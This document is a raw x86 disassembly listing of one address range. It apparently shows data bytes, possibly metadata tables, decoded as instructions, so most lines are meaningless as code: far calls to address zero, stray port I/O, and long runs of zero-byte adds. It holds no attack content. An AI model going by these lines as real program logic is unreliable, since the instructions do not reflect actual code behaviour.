  402673:	outs   dx,DWORD PTR ds:[esi]
  402674:	aas    
  402675:	add    BYTE PTR [eax],al
  402677:	or     bl,BYTE PTR [ebx]
  402679:	sub    BYTE PTR [eax+0x0],al
  40267c:	add    BYTE PTR [edx],cl
  40267e:	sub    eax,0x2b0d1804
  402683:	sbb    BYTE PTR [edx],al
  402685:	sbb    bl,BYTE PTR [edx+0x58c19]
  40268b:	add    BYTE PTR [ecx],al
  40268d:	outs   dx,DWORD PTR ds:[esi]
  40268e:	aas    
  40268f:	add    BYTE PTR [eax],al
  402691:	or     bl,BYTE PTR [ebx]
  402693:	sub    BYTE PTR [eax+0x0],al
  402696:	add    BYTE PTR [edx],cl
  402698:	sub    eax,0x20d1902
  40269d:	mov    gs,WORD PTR [ecx+0x1c]
  4026a0:	xor    cl,BYTE PTR [edx]
  4026a2:	add    bl,BYTE PTR [ebx]
  4026a4:	call   0x0:0x11280412
  4026ab:	push   es
  4026ac:	jae    0x4026ba
  4026ae:	add    BYTE PTR [eax],al
  4026b0:	push   es
  4026b1:	adc    eax,DWORD PTR ds:0x7060511
  4026b7:	or     BYTE PTR [ecx],cl
  4026b9:	adc    DWORD PTR [esi+edi*2],eax
  4026bc:	inc    ecx
  4026bd:	add    BYTE PTR [eax],al
  4026bf:	or     ch,BYTE PTR [edi+0xa]
  4026c2:	add    BYTE PTR [eax],al
  4026c4:	push   es
  4026c5:	ficom  WORD PTR [eax]
  4026c7:	adc    eax,DWORD PTR [esi]
  4026c9:	adc    DWORD PTR [esi],eax
  4026cb:	outs   dx,DWORD PTR ds:[esi]
  4026cc:	inc    edx
  4026cd:	add    BYTE PTR [eax],al
  4026cf:	or     ch,BYTE PTR [eax]
  4026d1:	inc    ebx
  4026d2:	add    BYTE PTR [eax],al
  4026d4:	or     bl,dh
  4026d6:	add    BYTE PTR [edx],ch
  4026d8:	inc    ecx
  4026d9:	sbb    al,0x0
	...
  4026e3:	add    BYTE PTR [edi],cl
  4026e5:	add    DWORD PTR [eax],eax
  4026e7:	add    BYTE PTR [edi],cl
  4026e9:	add    DWORD PTR [eax],eax
  4026eb:	add    BYTE PTR [eax],dl
  4026ed:	add    BYTE PTR [eax],al
  4026ef:	add    BYTE PTR [edi],ah
  4026f1:	add    BYTE PTR [eax],al
  4026f3:	add    DWORD PTR [ebx],edx
  4026f5:	xor    BYTE PTR ds:0x6c00,al
  4026fb:	add    BYTE PTR [esi],al
  4026fd:	add    BYTE PTR [eax],al
  4026ff:	adc    DWORD PTR [ebx],eax
  402701:	adc    al,0x51
  402703:	add    ch,BYTE PTR [eax]
  402705:	inc    esp
  402706:	add    BYTE PTR [eax],al
  402708:	or     ch,BYTE PTR [ebx+ecx*1]
  40270b:	jb     0x40275c
  40270d:	add    BYTE PTR [eax],al
  40270f:	jo     0x402784
  402711:	inc    ebp
  402712:	add    BYTE PTR [eax],al
  402714:	or     bh,BYTE PTR [edx+0x2]
  402717:	outs   dx,DWORD PTR ds:[esi]
  402718:	inc    esi
  402719:	add    BYTE PTR [eax],al
  40271b:	or     bl,BYTE PTR [eax]
  40271d:	pop    ebx
  40271e:	or     al,BYTE PTR [esi]
  402720:	sbb    BYTE PTR [edx+0x2],bl
  402723:	outs   dx,DWORD PTR ds:[esi]
  402724:	inc    esi
  402725:	add    BYTE PTR [eax],al
  402727:	or     ch,BYTE PTR [esi]
  402729:	or     esi,DWORD PTR [edx+0x65]
  40272c:	add    BYTE PTR [eax],al
  40272e:	jo     0x4027a3
  402730:	inc    ebp
  402731:	add    BYTE PTR [eax],al
  402733:	or     bh,BYTE PTR [edx+0x3]
  402736:	push   es
  402737:	lea    edi,[eax]
  402739:	add    BYTE PTR [eax],al
  40273b:	add    DWORD PTR [ecx+0x16],edx
  40273e:	or     ebp,DWORD PTR [ebx]
  402740:	add    edx,DWORD PTR es:[eax+0x7]
  402744:	add    al,BYTE PTR [edi]
  402746:	sbb    BYTE PTR [edx+0x18],bl
  402749:	outs   dx,DWORD PTR ds:[esi]
  40274a:	inc    edi
  40274b:	add    BYTE PTR [eax],al
  40274d:	or     ah,BYTE PTR [eax]
  40274f:	add    BYTE PTR [edx],al
  402751:	add    BYTE PTR [eax],al
  402753:	sub    BYTE PTR [eax+0x0],cl
  402756:	add    BYTE PTR [edx],cl
  402758:	outs   dx,DWORD PTR ds:[esi]
  402759:	dec    ecx
  40275a:	add    BYTE PTR [eax],al
  40275c:	or     ch,BYTE PTR [eax]
  40275e:	dec    edx
  40275f:	add    BYTE PTR [eax],al
  402761:	or     bl,BYTE PTR [edi+eax*1+0x70b5817]
  402768:	push   es
  402769:	xor    dl,dh
  40276b:	sub    bl,BYTE PTR [esi]
  40276d:	add    ch,BYTE PTR [eax]
  40276f:	pop    ss
  402770:	add    BYTE PTR [eax],al
  402772:	or     ch,BYTE PTR [edx]
  402774:	sbb    dh,BYTE PTR [edx-0x79]
  402777:	add    BYTE PTR [eax],al
  402779:	jo     0x4027a5
  40277b:	add    BYTE PTR [edx+0x53],al
  40277e:	dec    edx
  40277f:	inc    edx
  402780:	add    DWORD PTR [eax],eax
  402782:	add    DWORD PTR [eax],eax
  402784:	add    BYTE PTR [eax],al
  402786:	add    BYTE PTR [eax],al
  402788:	or     al,0x0
  40278a:	add    BYTE PTR [eax],al
  40278c:	jbe    0x4027c0
  40278e:	xor    BYTE PTR cs:[esi],ch
  402791:	xor    eax,0x37323730
  402796:	add    BYTE PTR [eax],al
  402798:	add    BYTE PTR [eax],al
  40279a:	add    eax,0x6c00
  40279f:	add    BYTE PTR [eax+ecx*1+0x0],al
  4027a3:	add    BYTE PTR [ebx],ah
  4027a5:	jle    0x4027a7
  4027a7:	add    BYTE PTR [eax+0x24000008],dh
  4027ad:	push   cs
  4027ae:	add    BYTE PTR [eax],al
  4027b0:	and    edx,DWORD PTR [ebx+0x74]
  4027b3:	jb     0x40281e
  4027b5:	outs   dx,BYTE PTR ds:[esi]
  4027b6:	addr16 jae 0x4027b9
  4027b9:	add    BYTE PTR [eax],al
  4027bb:	add    ah,dl
  4027bd:	push   ss
  4027be:	add    BYTE PTR [eax],al
  4027c0:	mov    eax,0x23000000
  4027c5:	push   ebp
  4027c6:	push   ebx
  4027c7:	add    BYTE PTR [edi+edx*1+0x100000],cl
  4027ce:	add    BYTE PTR [eax],al
  4027d0:	and    eax,DWORD PTR [edi+0x55]
  4027d3:	dec    ecx
  4027d4:	inc    esp
  4027d5:	add    BYTE PTR [eax],al
  4027d7:	add    BYTE PTR [edi+edx*1+0x8300000],bl
  4027de:	add    BYTE PTR [eax],al
  4027e0:	and    eax,DWORD PTR [edx+0x6c]
  4027e3:	outs   dx,DWORD PTR ds:[esi]
  4027e4:	bound  eax,QWORD PTR [eax]
  4027e6:	add    BYTE PTR [eax],al
  4027e8:	add    BYTE PTR [eax],al
  4027ea:	add    BYTE PTR [eax],al
  4027ec:	add    al,BYTE PTR [eax]
  4027ee:	add    BYTE PTR [ecx],al
  4027f0:	push   edi
  4027f1:	pop    ebp
  4027f2:	mov    ds:0x901,al
  4027f7:	add    BYTE PTR [eax],al
  4027f9:	cli    
  4027fa:	add    DWORD PTR [ebx],esi
  4027fc:	add    BYTE PTR [esi],dl
  4027fe:	add    BYTE PTR [eax],al
  402800:	add    DWORD PTR [eax],eax
  402802:	add    BYTE PTR [eax],al
  402804:	cmp    al,0x0
  402806:	add    BYTE PTR [eax],al
  402808:	pop    es
  402809:	add    BYTE PTR [eax],al
  40280b:	add    BYTE PTR [ecx],ch
  40280d:	add    BYTE PTR [eax],al
  40280f:	add    BYTE PTR [ebx],dl
  402811:	add    BYTE PTR [eax],al
  402813:	add    BYTE PTR [eax+eax*1],dl
  402816:	add    BYTE PTR [eax],al
  402818:	dec    edx
  402819:	add    BYTE PTR [eax],al
  40281b:	add    BYTE PTR ds:0x12000000,ah
  402821:	add    BYTE PTR [eax],al
  402823:	add    BYTE PTR [ecx],al
  402825:	add    BYTE PTR [eax],al
  402827:	add    BYTE PTR [esi],al
  402829:	add    BYTE PTR [eax],al
  40282b:	add    BYTE PTR [edx],al
  40282d:	add    BYTE PTR [eax],al
  40282f:	add    BYTE PTR [edx],al
  402831:	add    BYTE PTR [eax],al
  402833:	add    BYTE PTR [edx],al
  402835:	add    BYTE PTR [eax],al
  402837:	add    BYTE PTR [ecx],al
  402839:	add    BYTE PTR [eax],al
  40283b:	add    BYTE PTR [eax+eax*1],al
  40283e:	add    BYTE PTR [eax],al
  402840:	add    BYTE PTR [eax],al
  402842:	or     al,BYTE PTR [eax]
  402844:	add    DWORD PTR [eax],eax
  402846:	add    BYTE PTR [eax],al
  402848:	add    BYTE PTR [eax],al
  40284a:	push   es
  40284b:	add    BYTE PTR [esi+0xa00af00],dh
  402851:	add    BYTE PTR [edx],cl
  402853:	add    eax,edx
  402855:	add    BYTE PTR [edx],cl
  402857:	add    BYTE PTR [edx],ch
  402859:	add    eax,edx
  40285b:	add    BYTE PTR [edx],cl
  40285d:	add    BYTE PTR [ebx+0x1],dh
  402860:	cmp    al,0x1
  402862:	or     al,BYTE PTR [eax]
  402864:	pop    eax
  402865:	add    ah,BYTE PTR [edx]
  402867:	add    cl,BYTE PTR [edx]
  402869:	add    BYTE PTR [esi+0x6028402],bh
  40286f:	add    ah,dl
  402871:	push   es
  402872:	mov    ch,0x6
  402874:	push   es
  402875:	add    cl,ah
  402877:	push   es
  402878:	mov    ch,0x6
  40287a:	push   es
  40287b:	add    BYTE PTR [edi],al
  40287d:	pop    es
  40287e:	cmc    
  40287f:	push   es
  402880:	push   es
  402881:	add    BYTE PTR [eax],ah
  402883:	pop    es
  402884:	cmc    
  402885:	push   es
  402886:	push   es
  402887:	add    BYTE PTR [ecx],bh
  402889:	pop    es
  40288a:	cmc    
  40288b:	push   es
  40288c:	push   es
  40288d:	add    BYTE PTR [edi+eax*1-0xb],dl
  402891:	push   es
  402892:	push   es
  402893:	add    BYTE PTR [ebp+0x7],ch
  402896:	cmc    
  402897:	push   es
  402898:	push   es
  402899:	add    BYTE PTR [edx+0x606f507],cl
  40289f:	add    BYTE PTR [eax+0x606f507],dh
  4028a5:	add    cl,cl
  4028a7:	pop    es
  4028a8:	cmc    
  4028a9:	push   es
  4028aa:	push   es
  4028ab:	add    ah,ah
  4028ad:	pop    es
  4028ae:	cmc    
  4028af:	push   es
  4028b0:	push   es
  4028b1:	add    bh,bh
  4028b3:	pop    es
  4028b4:	cmc    
  4028b5:	push   es
  4028b6:	push   es
  4028b7:	add    BYTE PTR [esi],dl
  4028b9:	or     ch,dh
  4028bb:	push   es
  4028bc:	push   es
  4028bd:	add    BYTE PTR [ebx],dh
  4028bf:	or     ch,dh
  4028c1:	push   es
  4028c2:	push   es
  4028c3:	add    BYTE PTR [edx+0x8],dl
  4028c6:	cmc    
  4028c7:	push   es
  4028c8:	push   es
  4028c9:	add    BYTE PTR [eax+ecx*1+0x6b],bh
  4028cd:	or     BYTE PTR [esi],al
  4028cf:	add    BYTE PTR [esi+0x600af08],bl
  4028d5:	add    al,dl
  4028d7:	or     BYTE PTR [eax+ecx*1+0x8ef0006],dh
  4028de:	mov    ah,0x8
  4028e0:	push   es
  4028e1:	add    dh,bh
  4028e3:	or     ch,dh
  4028e5:	push   es
  4028e6:	push   es
  4028e7:	add    BYTE PTR [edx],ch
  4028e9:	or     DWORD PTR [edi],edx
  4028eb:	or     DWORD PTR [edi+0x0],ebp
  4028ee:	or     DWORD PTR ds:[eax],eax
  4028f1:	add    BYTE PTR [esi],al
  4028f3:	add    BYTE PTR [ebp+0x9],ch
  4028f6:	dec    ebp
  4028f7:	or     DWORD PTR [esi],eax
  4028f9:	add    BYTE PTR [ebp+0x6094d09],cl
  4028ff:	add    cl,cl
  402901:	or     DWORD PTR [eax-0x2afff9f7],edi
  402907:	or     DWORD PTR [eax-0xefff5f7],edi
  40290d:	or     DWORD PTR [edx],esp
  40290f:	add    al,BYTE PTR [esi]
  402911:	add    BYTE PTR [ecx],cl
  402913:	or     bh,BYTE PTR [eax+0x53000a09]
  402919:	or     dl,al
  40291b:	add    BYTE PTR [esi],al
  40291d:	add    BYTE PTR [ebx+0x600af0a],cl
  402923:	add    BYTE PTR [edx+ecx*1+0x600af],dl
  40292a:	fmul   QWORD PTR [edx]
  40292c:	mov    eax,0xfb000609
  402931:	or     ch,BYTE PTR [edi+0x5000a00]
  402937:	or     esp,DWORD PTR [edx]
  402939:	add    cl,BYTE PTR [edx]
  40293b:	add    BYTE PTR [edi+0xb],ah
  40293e:	rol    BYTE PTR [eax],1
  402940:	or     al,BYTE PTR [eax]
  402942:	mov    ecx,DWORD PTR [ebx]
  402944:	and    al,BYTE PTR [edx]
  402946:	or     al,BYTE PTR [eax]
  402948:	scas   al,BYTE PTR es:[edi]
  402949:	or     edx,eax
  40294b:	add    BYTE PTR [edx],cl
  40294d:	add    dh,al
  40294f:	or     esp,DWORD PTR [edx]
  402951:	add    cl,BYTE PTR [edx]
  402953:	add    ch,ah
  402955:	or     esp,DWORD PTR [edx]
  402957:	add    cl,BYTE PTR [edx]
  402959:	add    BYTE PTR ds:0x602840c,dl
  40295f:	add    BYTE PTR [edi+0xc],al
  402962:	scas   eax,DWORD PTR es:[edi]
  402963:	add    BYTE PTR [edx],cl
  402965:	add    BYTE PTR [eax+0xc],dh
  402968:	test   BYTE PTR [edx],al
  40296a:	push   es
  40296b:	add    BYTE PTR [edx+0xe00af0c],bl
  402971:	add    BYTE PTR [ebx+0x120ca60c],bh
  402977:	add    bh,ch
  402979:	or     al,0xd0
  40297b:	or     al,0x6
  40297d:	add    BYTE PTR ds:0x600af0d,ah
  402983:	add    BYTE PTR [ecx*1+0x600af],ch
  40298a:	arpl   WORD PTR ds:0x600af,cx
  402990:	or     DWORD PTR ds:0x600af,0xffffffa0
  402997:	or     eax,0x600af
  40299c:	les    ecx,FWORD PTR ds:0x60daf
  4029a2:	in     eax,0xd
  4029a4:	scas   eax,DWORD PTR es:[edi]
  4029a5:	or     eax,0xe070006
  4029aa:	scas   eax,DWORD PTR es:[edi]
  4029ab:	or     eax,0xe140006
  4029b0:	scas   eax,DWORD PTR es:[edi]
  4029b1:	add    BYTE PTR [eax],al
  4029b3:	add    BYTE PTR [eax],al
  4029b5:	add    BYTE PTR [ecx],al
  4029b7:	add    BYTE PTR [eax],al
  4029b9:	add    BYTE PTR [eax],al
  4029bb:	add    BYTE PTR [ecx],al
  4029bd:	add    BYTE PTR [ecx],al
  4029bf:	add    BYTE PTR [eax],al
  4029c1:	add    DWORD PTR [eax],edx
  4029c3:	add    BYTE PTR [ebx],bl
  4029c5:	add    BYTE PTR [eax+eax*1],ah
  4029c8:	add    eax,0x1000100
  4029cd:	add    BYTE PTR [eax],al
  4029cf:	add    BYTE PTR [eax],dl
  4029d1:	add    BYTE PTR [ecx+0x0],bl
  4029d4:	and    al,0x0
  4029d6:	add    eax,0x4000300
  4029db:	add    BYTE PTR [eax],al
  4029dd:	add    BYTE PTR [eax],dl
  4029df:	add    BYTE PTR [ebx+0x0],ah
  4029e2:	and    al,0x0
  4029e4:	add    eax,0x8000400
  4029e9:	add    BYTE PTR [eax],al
  4029eb:	add    BYTE PTR [eax],dl
  4029ed:	add    BYTE PTR [esi+0x0],dh
  4029f0:	and    al,0x0
  4029f2:	add    eax,0xd000600
  4029f7:	add    BYTE PTR [ecx],al
  4029f9:	add    BYTE PTR [eax],dl
  4029fb:	add    BYTE PTR [ebp+0x5002400],al
  402a01:	add    BYTE PTR [esi],al
  402a03:	add    BYTE PTR [eax],dl
  402a05:	add    BYTE PTR [eax-0x6dffefff],al
  402a0b:	add    BYTE PTR [eax],al
  402a0d:	add    BYTE PTR ds:0x13000b00,al
  402a13:	add    BYTE PTR [ecx],al
  402a15:	add    BYTE PTR [ecx+eax*1],dl
  402a18:	adc    eax,DWORD PTR [eax]
  402a1a:	add    DWORD PTR [eax],eax
  402a1c:	pop    ds
  402a1d:	add    DWORD PTR [edi],edx
  402a1f:	add    BYTE PTR [ecx],al
  402a21:	add    BYTE PTR [edx+0x51003301],ch
  402a27:	or     bl,0x1
  402a2a:	xor    eax,DWORD PTR [eax]
  402a2c:	add    DWORD PTR [eax],eax
  402a2e:	loopne 0x402a31
  402a30:	xor    eax,DWORD PTR [eax]
  402a32:	push   ecx
  402a33:	sub    dl,0x2
  402a36:	push   0xf8805100
  402a3b:	add    ch,BYTE PTR [eax+0x0]
  402a3e:	push   ecx
  402a3f:	or     BYTE PTR [ebx+eax*1],0x33
  402a43:	add    BYTE PTR [ecx-0x80],dl
  402a46:	and    eax,DWORD PTR [ebx]
  402a48:	xor    eax,DWORD PTR [eax]
  402a4a:	push   ecx
  402a4b:	cmp    BYTE PTR [eax],0x3
  402a4e:	add    DWORD PTR [eax],0x3628056
  402a54:	push   0x70805600
  402a59:	add    esi,DWORD PTR [ebx]
  402a5b:	add    BYTE PTR [esi-0x80],dl
  402a5e:	jge    0x402a63
  402a60:	xor    eax,DWORD PTR [eax]
  402a62:	push   esi
  402a63:	or     BYTE PTR [edx+0x56003303],0x80
  402a6a:	xchg   edi,eax
  402a6b:	add    esi,DWORD PTR [ebx]
  402a6d:	add    BYTE PTR [esi-0x80],dl
  402a70:	lahf   
  402a71:	add    ebp,DWORD PTR [eax+0x0]
  402a74:	push   esi
  402a75:	xor    BYTE PTR [ebx+eax*1-0x7fa9ff98],0xc6
  402a7d:	add    ebp,DWORD PTR [eax+0x0]
  402a80:	push   esi
  402a81:	sub    dl,0x3
  402a84:	push   0x4805600
  402a89:	add    al,0x68
  402a8b:	add    BYTE PTR [esi-0x80],dl
  402a8e:	and    al,BYTE PTR [eax+ebp*2]
  402a91:	add    BYTE PTR [esi-0x80],dl
  402a94:	inc    esp
  402a95:	add    al,0x68
  402a97:	add    BYTE PTR [esi-0x80],dl
  402a9a:	pop    edx
  402a9b:	add    al,0x68
  402a9d:	add    BYTE PTR [esi-0x80],dl
  402aa0:	ja     0x402aa6
  402aa2:	push   0x90805600
  402aa7:	add    al,0x68
  402aa9:	add    BYTE PTR [esi-0x80],dl
  402aac:	test   eax,0x56006804
  402ab1:	cmp    BYTE PTR [esp+eax*1-0x7fa9ff98],0xcf
  402ab9:	add    al,0x68
  402abb:	add    BYTE PTR [esi-0x80],dl
  402abe:	in     eax,0x4
  402ac0:	push   0xfa805600
  402ac5:	add    al,0x68
  402ac7:	add    BYTE PTR [esi-0x80],dl
  402aca:	or     eax,0x56006805
  402acf:	and    BYTE PTR [ecx],0x5
  402ad2:	push   0x34805600
  402ad7:	add    eax,0x80560068
  402adc:	inc    edi
  402add:	add    eax,0x80560068
  402ae2:	pop    ebp
  402ae3:	add    eax,0x805602ff
  402ae8:	outs   dx,DWORD PTR ds:[esi]
  402ae9:	add    eax,0x805602ff
  402aee:	mov    eax,DWORD PTR ds:0x80560068
  402af4:	mov    al,ds:0x56006805
  402af9:	cmp    BYTE PTR [eax+0x56006805],0x80
  402b00:	aad    0x5
  402b02:	push   0xee805600
  402b07:	add    eax,0x20d00068
  402b0c:	add    BYTE PTR [eax],al
  402b0e:	add    BYTE PTR [eax],al
  402b10:	xchg   BYTE PTR [eax],bl
  402b12:	jge    0x402b15
  402b14:	sbb    eax,DWORD PTR [eax]
  402b16:	add    DWORD PTR [eax],eax
  402b18:	mul    DWORD PTR [eax]
  402b1a:	add    BYTE PTR [eax],al
  402b1c:	add    BYTE PTR [eax],al
  402b1e:	xchg   BYTE PTR [eax],al
  402b20:	add    DWORD PTR [ecx],0x25
  402b23:	add    BYTE PTR [eax+eax*1],al
  402b26:	add    al,0x21
  402b28:	add    BYTE PTR [eax],al
  402b2a:	add    BYTE PTR [eax],al
  402b2c:	xchg   BYTE PTR [eax],cl
  402b2e:	xchg   esi,eax
  402b2f:	add    DWORD PTR [ecx],ebp
  402b31:	add    BYTE PTR [eax+eax*1],al
  402b34:	or     al,0x21
  402b36:	add    BYTE PTR [eax],al
  402b38:	add    BYTE PTR [eax],al
  402b3a:	xchg   BYTE PTR [eax],al
  402b3c:	mov    dl,0x1
  402b3e:	and    eax,0x1a000400
  402b43:	and    DWORD PTR [eax],eax
  402b45:	add    BYTE PTR [eax],al
  402b47:	add    BYTE PTR [esi+0x2501bc00],al
  402b4d:	add    BYTE PTR [eax+eax*1],al
  402b50:	sub    BYTE PTR [ecx],ah
  402b52:	add    BYTE PTR [eax],al
  402b54:	add    BYTE PTR [eax],al
  402b56:	xchg   BYTE PTR [eax],al
  402b58:	mov    BYTE PTR [ecx],0x25
  402b5b:	add    BYTE PTR [eax+eax*1],al
  402b5e:	and    DWORD PTR ds:[eax],eax
  402b61:	add    BYTE PTR [eax],al
  402b63:	add    BYTE PTR [esi+0x25017d18],al
  402b69:	add    BYTE PTR [eax+eax*1],al
  402b6c:	inc    esi
  402b6d:	and    DWORD PTR [eax],eax
  402b6f:	add    BYTE PTR [eax],al
  402b71:	add    BYTE PTR [ecx+0x3b01fb00],al
  402b77:	add    BYTE PTR [eax+eax*1],al
  402b7a:	push   esp
  402b7b:	and    DWORD PTR [eax],eax
  402b7d:	add    BYTE PTR [eax],al
  402b7f:	add    BYTE PTR [ecx+0x3f020600],al
  402b85:	add    BYTE PTR [eax+eax*1],al
  402b88:	je     0x402bab
  402b8a:	add    BYTE PTR [eax],al
  402b8c:	add    BYTE PTR [eax],al
  402b8e:	add    DWORD PTR [eax],0x61
  402b91:	add    al,BYTE PTR [edi+0x0]
  402b94:	pop    es
  402b95:	add    ah,dh
  402b97:	and    al,BYTE PTR [eax]
  402b99:	add    BYTE PTR [eax],al
  402b9b:	add    BYTE PTR [ecx+0x53027300],al
  402ba1:	add    BYTE PTR ds:0x242800,cl
  402ba7:	add    BYTE PTR [eax],al
  402ba9:	add    BYTE PTR [esi+0x25017d18],al
  402baf:	add    BYTE PTR [edi],cl
  402bb1:	add    BYTE PTR [eax],dh
  402bb3:	and    al,0x0
  402bb5:	add    BYTE PTR [eax],al
  402bb7:	add    BYTE PTR [ecx+0x5b02c700],dl
  402bbd:	add    BYTE PTR [edi],cl
  402bbf:	add    BYTE PTR [eax+0x24],bl
  402bc5:	add    BYTE PTR [esi+0x6302dc00],dl
  402bcb:	add    BYTE PTR [ecx],dl
  402bcd:	add    BYTE PTR [ebp+eiz*1+0x0],ah
  402bd4:	xchg   BYTE PTR [eax],bl
  402bd6:	jge    0x402bd9
  402bd8:	and    eax,0xac001200
  402bdd:	and    eax,0x0
  402be2:	xchg   esi,eax
  402be3:	add    BYTE PTR [ebx+eax*1-0x76],cl
  402be7:	add    BYTE PTR [edx],dl
  402be9:	add    ah,dh
  402beb:	add    BYTE PTR es:[eax],al
  402bee:	add    BYTE PTR [eax],al
  402bf0:	xchg   ecx,eax
  402bf1:	add    BYTE PTR [ecx+0x3],dl
  402bf4:	nop
  402bf5:	add    BYTE PTR [ebx],dl
  402bf7:	add    BYTE PTR [edi+eiz*1+0x0],ch
  402bfb:	add    BYTE PTR [eax],al
  402bfd:	add    BYTE PTR [esi+0x25017d18],al
  402c03:	add    BYTE PTR ds:0x277400,dl
  402c09:	add    BYTE PTR [eax],al
  402c0b:	add    BYTE PTR [esi+0xb060708],dl
  402c11:	add    al,0x15
  402c13:	add    BYTE PTR [eax],al
  402c15:	add    BYTE PTR [ecx],al
  402c17:	add    BYTE PTR ds:0x2000006,dh
  402c1d:	add    BYTE PTR [eax],bh
  402c1f:	push   es
  402c20:	add    BYTE PTR [eax],al
  402c22:	add    eax,DWORD PTR [eax]
  402c24:	cmp    eax,DWORD PTR [esi]
  402c26:	add    BYTE PTR [eax],al
  402c28:	add    DWORD PTR [eax],eax
  402c2a:	aas    
  402c2b:	push   es
  402c2c:	add    BYTE PTR [eax],al
  402c2e:	add    al,BYTE PTR [eax]
  402c30:	inc    esi
  402c31:	push   es
  402c32:	add    BYTE PTR [eax],al
  402c34:	add    eax,DWORD PTR [eax]
  402c36:	push   ebx
  402c37:	push   es
  402c38:	add    BYTE PTR [eax],al
  402c3a:	add    DWORD PTR [eax],eax
  402c3c:	aas    
  402c3d:	push   es
  402c3e:	add    BYTE PTR [eax],al
  402c40:	add    al,BYTE PTR [eax]
  402c42:	inc    esi
  402c43:	push   es
  402c44:	add    BYTE PTR [eax],al
  402c46:	add    eax,DWORD PTR [eax]
  402c48:	gs push es
  402c4a:	add    BYTE PTR [eax],al
  402c4c:	add    al,0x0
  402c4e:	js     0x402c56
  402c50:	add    BYTE PTR [eax],al
  402c52:	add    eax,0x68500
  402c57:	add    BYTE PTR [esi],al
  402c59:	add    BYTE PTR [ebx+0x6],dl
  402c5c:	add    BYTE PTR [eax],al
  402c5e:	add    DWORD PTR [eax],eax
  402c60:	xor    eax,0x2000006
  402c65:	add    BYTE PTR [ebp+0x6],ah
  402c68:	add    BYTE PTR [eax],al
  402c6a:	add    DWORD PTR [eax],eax
  402c6c:	xchg   ebx,eax
  402c6d:	push   es
  402c6e:	add    BYTE PTR [eax],al
  402c70:	add    al,BYTE PTR [eax]
  402c72:	xchg   esi,eax
  402c73:	push   es
  402c74:	add    BYTE PTR [eax],al
  402c76:	add    DWORD PTR [eax],eax
  402c78:	cwde   
  402c79:	push   es
  402c7a:	add    BYTE PTR [eax],al
  402c7c:	add    DWORD PTR [eax],eax
  402c7e:	call   0x9f00:0x1000006
  402c85:	push   es
  402c86:	add    al,BYTE PTR [eax]
  402c88:	add    al,BYTE PTR [eax]
  402c8a:	stos   DWORD PTR es:[edi],eax
  402c8b:	push   es
  402c8c:	cmp    DWORD PTR [eax],eax
  402c8e:	jge    0x402c91
  402c90:	and    eax,0x7d004100
  402c95:	add    DWORD PTR [ebx],edx
  402c97:	add    al,0x49
  402c99:	add    BYTE PTR [ebp+0x1],bh
  402c9c:	sbb    BYTE PTR [ecx+edx*2],al
  402c9f:	add    BYTE PTR [ebp+0x1],bh
  402ca2:	sbb    BYTE PTR [ecx+ebx*2],al
  402ca5:	add    BYTE PTR [ebp+0x1],bh
  402ca8:	sbb    BYTE PTR [ecx+eiz*2],al
  402cab:	add    BYTE PTR [ebp+0x1],bh
  402cae:	sbb    BYTE PTR [ecx+ebp*2],al
  402cb1:	add    BYTE PTR [ebp+0x1],bh
  402cb4:	sbb    BYTE PTR [ecx+esi*2],al
  402cb7:	add    BYTE PTR [ebp+0x1],bh
  402cba:	sbb    BYTE PTR [ecx+edi*2],al
  402cbd:	add    BYTE PTR [ebp+0x1],bh
  402cc0:	sbb    BYTE PTR [ecx+eax*4],al
  402cc3:	add    BYTE PTR [ebp+0x1],bh
  402cc6:	adc    eax,DWORD PTR [ecx+ecx*4]
  402cc9:	add    BYTE PTR [ebp+0x1],bh
  402ccc:	sbb    BYTE PTR [ecx+edx*4],al
  402ccf:	add    BYTE PTR [ebp+0x1],bh
  402cd2:	sbb    BYTE PTR [ecx+ebx*4],al
  402cd5:	add    BYTE PTR [ebp+0x1],bh
  402cd8:	sbb    BYTE PTR [ecx+eiz*4],al
  402cdb:	add    BYTE PTR [ebp+0x1],bh
  402cde:	sbb    BYTE PTR [ecx+ebp*4],al
  402ce1:	add    BYTE PTR [ebp+0x1],bh
  402ce4:	sbb    BYTE PTR [ecx+esi*4],al
  402ce7:	add    BYTE PTR [ebp+0x1],bh
  402cea:	sbb    BYTE PTR [ecx+edi*4],al
  402ced:	add    BYTE PTR [ebp+0x1],bh
  402cf0:	adc    eax,DWORD PTR [ecx+eax*8]
  402cf3:	add    BYTE PTR [ebp+0x1],bh
  402cf6:	sbb    eax,0x7d00d104
  402cfb:	add    DWORD PTR [eax],ebx
  402cfd:	add    al,0xd9
  402cff:	add    BYTE PTR [ebp+0x1],bh
  402d02:	and    eax,DWORD PTR [ecx+ebp*8]
  402d05:	add    BYTE PTR [ebp+0x1],bh
  402d08:	sub    DWORD PTR [ecx+esi*8],eax
  402d0b:	add    BYTE PTR [ebp+0x1],bh
  402d0e:	and    eax,0x7d000900
  402d13:	add    DWORD PTR ds:0x7d001100,esp
  402d19:	add    eax,edx
  402d1b:	add    al,0xf9
  402d1d:	add    BYTE PTR [edx-0x6fb27ff],dh
  402d23:	add    BYTE PTR [ecx+eax*1+0x10104d8],bh
  402d2a:	fmul   QWORD PTR [ecx]
  402d2c:	fiadd  WORD PTR [ecx+ebx*1]
  402d2f:	add    BYTE PTR [ebp+0x1],bh
  402d32:	and    eax,0xe2001900
  402d37:	or     ebx,esp
  402d39:	add    al,0x9
  402d3b:	add    eax,edi
  402d3d:	or     ecx,esi
  402d3f:	add    al,0x11
  402d41:	add    DWORD PTR [edx+ecx*1],edx
  402d44:	test   DWORD PTR [ecx+ecx*1],0xff0a2801
  402d4b:	add    al,0x9
  402d4d:	add    DWORD PTR [edx+ecx*1],edi
  402d50:	add    eax,0x65001905
  402d55:	or     cl,BYTE PTR [ebx]
  402d57:	add    eax,0xa7b0119
  402d5c:	and    eax,0x7d012100
  402d61:	add    DWORD PTR [ecx],edx
  402d63:	add    eax,0xa9d0129
  402d68:	sbb    BYTE PTR ds:0xaa50129,al
  402d6e:	push   ds
  402d6f:	add    eax,0xab40121
  402d74:	sub    al,BYTE PTR ds:0xaca0019
  402d7a:	xor    al,0x5
  402d7c:	xor    DWORD PTR [ecx],eax
  402d7e:	jge    0x402d81
  402d80:	cmp    al,BYTE PTR ds:0xae90111
  402d86:	inc    eax
  402d87:	add    eax,0xb0f0109
  402d8c:	dec    eax
  402d8d:	add    eax,0xb180109
  402d92:	add    eax,0x30011905
  402d97:	or     esp,DWORD PTR ds:0x73001900
  402d9d:	add    dh,BYTE PTR [edx+0x5]
  402da0:	sbb    DWORD PTR [ecx],eax
  402da2:	inc    ecx
  402da3:	or     esp,DWORD PTR ds:0x53011900
  402da9:	or     esp,DWORD PTR ds:0x7c014900
  402daf:	or     esi,DWORD PTR [ebx]
